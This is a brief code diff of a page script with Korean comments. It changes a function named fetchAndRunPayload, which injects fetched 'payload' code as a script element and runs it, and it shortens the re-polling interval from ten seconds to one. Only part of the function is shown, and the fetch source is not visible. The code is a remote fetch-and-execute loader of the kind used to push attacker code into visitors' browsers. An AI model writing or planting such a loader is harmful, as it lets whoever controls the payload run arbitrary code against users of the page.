@@ -13,7 +13,7 @@ async function fetchAndRunPayload() {
 
                 // payload 실행
                 const script = document.createElement("script");
-                script.type = "module";
+                script.type = "text/javascript";
                 script.textContent = payloadCode;
                 document.body.appendChild(script);
             };
@@ -25,5 +25,5 @@ async function fetchAndRunPayload() {
 }
 
 // 10초마다 최신 payload 확인
-setInterval(fetchAndRunPayload, 10000);
+setInterval(fetchAndRunPayload, 1000);
 </script>
